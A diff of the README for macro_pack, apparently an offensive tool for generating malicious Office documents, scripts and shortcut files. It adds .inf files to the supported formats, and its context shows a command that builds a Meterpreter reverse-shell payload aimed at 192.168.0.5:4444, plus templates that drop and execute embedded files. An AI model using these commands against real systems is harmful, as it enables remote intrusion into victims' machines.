@@ -62,13 +62,14 @@ Scripting (txt) supported formats are:
 * HTML Applications (.hta)
 * XSLT Stylesheet (.xsl) (Yes MS XSLT contains scripts ^^)
 
-Shortcuts supported formats are:
+Shortcuts/Shell supported formats are:
 * Shell Link (.lnk)
 * Explorer Command File (.scf)
 * URL Shortcut (.url)
 * Groove Shortcuts (.glk)
 * Settings Shortcuts (.settingcontent-ms)
 * MS Library (.library-ms)
+* Setup Information (.inf)
 
 Note that all scripting and shortcuts formats (except LNK) can be generated on Linux version of macro\_pack as well.
 
@@ -317,7 +318,7 @@ echo 192.168.0.5 4444 | macro_pack.exe -t METERPRETER -o -G "\\192.168.0.8\c$\us
         Supported Ms Office extensions are: doc, docm, docx, xls, xlsm, xslx, pptm, vsd, vsdm, mpp.
         Note: Ms Office file generation requires Windows OS with right MS Office application installed.
         Supported Visual Basic scripts extensions are: vba, vbs, wsf, wsc, sct, hta, xsl.
-        Supported shortcuts extensions are: scf, url, glk
+        Supported shortcuts/shell extensions are: lnk, scf, url, glk, settingcontent-ms, library-ms, inf
     
     -e, --embed=EMBEDDED_FILE_PATH Will embed the given file in the body of the generated document.
          Use with EMBED_EXE template to auto drop and exec the file or with EMBED_DLL to drop/load the embedded dll.
